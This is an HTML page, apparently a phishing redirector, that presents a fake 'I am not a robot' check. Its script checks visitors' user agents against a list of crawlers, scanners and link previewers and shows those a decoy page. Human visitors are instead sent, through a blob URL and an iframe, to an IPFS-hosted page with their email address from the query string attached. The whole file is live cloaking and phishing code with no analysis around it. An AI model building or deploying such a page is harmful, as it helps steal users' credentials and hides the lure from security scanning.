<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Redirect</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    /* Spinner animation */
    @keyframes spin { from { transform:rotate(0deg); } to { transform:rotate(360deg); } }
    @keyframes rotateRobot { from { transform:rotate(0deg); } to { transform:rotate(360deg); } }

    html, body { margin:0; padding:0; width:100%; height:100%; font-family:'Segoe UI', Tahoma, sans-serif; }
    #overlay {
        position:fixed; top:0; left:0; right:0; bottom:0;
        background:#f0f2f5; display:flex; align-items:center; justify-content:center;
        opacity:0; transition:opacity 0.3s ease; z-index:99999;
    }
    #verificationBox {
        background:#fff; padding:26px 32px; border-radius:8px;
        width:310px; text-align:left; border:1px solid #dcdcdc;
        box-shadow:0 6px 20px rgba(0,0,0,0.12);
    }
    #robotIcon { width:32px; height:32px; border-radius:50%; background:#e8f0fe;
        display:flex; align-items:center; justify-content:center; animation:rotateRobot 2s linear infinite; font-size:20px; }
    #checkbox { width:26px; height:26px; border:2px solid #7f8fa6; border-radius:4px; cursor:pointer; transition:0.3s; }
    #verifying { margin-top:18px; display:none; font-size:14px; color:#555; }
    .spinner { width:16px; height:16px; border-radius:50%; border:3px solid #40739e; border-top-color:transparent; animation:spin 0.6s linear infinite; }
    #badge { font-size:10px; color:#888; margin-top:18px; text-align:right; opacity:0.7; }
</style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div style="display:flex; align-items:center; gap:12px;">
            <div id="robotIcon">ðŸ¤–</div>
            <div style="flex:1;"><strong style="font-size:15px; color:#333;">I am not a robot</strong></div>
            <div id="checkbox"></div>
        </div>
        <div id="verifying">
            <div style="display:flex; align-items:center; gap:8px;">
                <div class="spinner"></div> Verifyingâ€¦
            </div>
        </div>
        <div id="badge">Protected by Human Verification</div>
    </div>
</div>

<script>
const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";

// Track human interaction
let humanMoved = false;
window.addEventListener("mousemove", () => humanMoved = true);
window.addEventListener("touchstart", () => humanMoved = true);

// Bot detection
function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botKeywords = [
        "bot","crawl","spider","slurp","fetch","preview",
        "facebook","discord","telegram","linkedin","whatsapp",
        "headless","python","curl","wget","scrapy",
        "phantom","selenium","puppeteer","playwright",
        "httpclient","go-http"
    ];
    if (botKeywords.some(x => ua.includes(x))) return true;
    if (navigator.webdriver && !window._testing) return true;
    return false;
}

// Show fake page for bots
function showFakeHTML() {
    document.body.innerHTML = `<div style="width:100%; height:100vh; display:flex;
        align-items:center; justify-content:center; font-family:Arial,sans-serif; color:#444;">
        <div><h2>Welcome</h2><p>This page is currently unavailable.</p></div></div>`;
}

// Human verification overlay
function requireHumanInteraction() {
    return new Promise(resolve => {
        const overlay = document.getElementById("overlay");
        overlay.style.opacity = 1;

        const checkbox = document.getElementById("checkbox");
        const verifying = document.getElementById("verifying");

        // Click or touch on checkbox counts
        checkbox.addEventListener("click", completeVerification);
        checkbox.addEventListener("touchstart", completeVerification);

        function completeVerification() {
            checkbox.style.background = "#40739e";
            checkbox.style.borderColor = "#40739e";
            verifying.style.display = "block";
            setTimeout(() => {
                overlay.style.opacity = 0;
                setTimeout(() => overlay.remove(), 300);
                resolve(true);
            }, 1200);
        }
    });
}

// Get email from URL
function getEmail() {
    return new URLSearchParams(location.search).get("email") || "";
}

// Build final IPFS URL
function buildIPFS(email) {
    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
}

// Blob HTML
function createBlobHTML(url) {
    return `<!DOCTYPE html><html><head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;}iframe{width:100%;height:100%;border:none;}</style>
        </head><body><iframe src="${url}"></iframe></body></html>`;
}

// Main
document.addEventListener("DOMContentLoaded", async () => {
    if (isBot()) { showFakeHTML(); return; }

    await new Promise(r => setTimeout(r, Math.random()*400+200));

    // Wait for human movement (desktop mouse or mobile touch)
    if (!humanMoved) {
        await new Promise(resolve => setTimeout(resolve, 800));
    }

    await requireHumanInteraction();

    const email = getEmail();
    const ipfsURL = buildIPFS(email);
    const blobHTML = createBlobHTML(ipfsURL);
    const blob = new Blob([blobHTML], {type:"text/html"});
    window.location.href = URL.createObjectURL(blob);
});
</script>

</body>
</html>
